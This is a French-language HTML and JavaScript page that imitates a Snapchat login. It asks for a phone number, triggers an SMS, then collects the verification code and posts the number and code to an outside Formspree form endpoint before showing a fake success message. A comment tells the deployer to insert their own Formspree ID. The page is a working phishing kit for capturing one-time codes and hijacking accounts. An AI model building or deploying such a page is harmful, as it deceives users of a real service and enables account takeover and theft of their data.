<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SnapDemo - Connexion</title>
    <style>
        body {
            background-color: #121212;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: #1e1e1e;
            padding: 30px;
            border-radius: 12px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            text-align: center;
        }
        input, button {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 8px;
            border: 1px solid #333;
            background: #2a2a2a;
            color: white;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            background: #fffc00;
            color: black;
            font-weight: bold;
            cursor: pointer;
            border: none;
        }
        button:hover {
            background: #e6df00;
        }
        .step {
            display: none;
        }
        .active {
            display: block;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Snapchat</h2>

        <!-- ÉTAPE 1 : Saisie du numéro -->
        <form id="formNumero" class="step active">
            <p>Entre ton numéro de téléphone pour te connecter :</p>
            <input type="tel" id="numero" name="numero" placeholder="Ex: 0612345678" required>
            <button type="submit" id="btnEnvoyerSms">Recevoir le code</button>
        </form>

        <!-- ÉTAPE 2 : Saisie du code reçu par SMS -->
        <form id="formCode" class="step">
            <p>Un code de validation a été envoyé par SMS à ton numéro.</p>
            <input type="text" id="codeSaisi" name="code_saisi" placeholder="Entre le code à 4 chiffres" required>
            <!-- Champ caché pour garder le numéro en mémoire pour Formspree -->
            <input type="hidden" id="numeroCache" name="numero_telephone">
            <button type="submit" id="btnValiderCode">Valider et se connecter</button>
        </form>

        <!-- ÉTAPE 3 : Succès final -->
        <div id="stepSuccess" class="step">
            <h3 style="color: #4BB543;">Connexion réussie !</h3>
            <p>Bienvenue sur ton compte.</p>
        </div>
    </div>

    <script>
        const formNumero = document.getElementById('formNumero');
        const formCode = document.getElementById('formCode');
        const stepSuccess = document.getElementById('stepSuccess');
        
        const btnEnvoyerSms = document.getElementById('btnEnvoyerSms');
        const btnValiderCode = document.getElementById('btnValiderCode');

        // ÉTAPE 1 : Demander l'envoi du SMS via l'API Vercel
        formNumero.addEventListener('submit', async function(e) {
            e.preventDefault();
            const numero = document.getElementById('numero').value;

            btnEnvoyerSms.innerText = "Envoi en cours...";
            btnEnvoyerSms.disabled = true;

            try {
                const response = await fetch('/api/send-sms', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ numero: numero })
                });

                const result = await response.json();

                if (response.ok && result.success) {
                    // Sauvegarder le numéro dans le champ caché de l'étape 2
                    document.getElementById('numeroCache').value = numero;

                    // Passer à l'étape 2 (Saisie du code)
                    formNumero.classList.remove('active');
                    formCode.classList.add('active');
                } else {
                    alert("Erreur : " + (result.error || "Impossible d'envoyer le SMS"));
                    btnEnvoyerSms.innerText = "Recevoir le code";
                    btnEnvoyerSms.disabled = false;
                }
            } catch (error) {
                alert("Erreur de connexion avec le serveur.");
                btnEnvoyerSms.innerText = "Recevoir le code";
                btnEnvoyerSms.disabled = false;
            }
        });

        // ÉTAPE 2 : Valider le code et transmettre à Formspree
        formCode.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const numero = document.getElementById('numeroCache').value;
            const codeSaisi = document.getElementById('codeSaisi').value;

            btnValiderCode.innerText = "Vérification...";
            btnValiderCode.disabled = true;

            try {
                // TRANSMISSION À FORMSPREE
                // ⚠️ Remplace "https://formspree.io/f/VOTRE_ID" par ton vrai lien Formspree
                const formspreeResponse = await fetch('https://formspree.io/f/VOTRE_ID', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        numero: numero,
                        code_verification: codeSaisi
                    })
                });

                if (formspreeResponse.ok) {
                    // Afficher le succès final
                    formCode.classList.remove('active');
                    stepSuccess.classList.add('active');
                } else {
                    alert("Erreur lors de la validation.");
                    btnValiderCode.innerText = "Valider et se connecter";
                    btnValiderCode.disabled = false;
                }
            } catch (error) {
                alert("Erreur réseau vers Formspree.");
                btnValiderCode.innerText = "Valider et se connecter";
                btnValiderCode.disabled = false;
            }
        });
    </script>
</body>
</html>
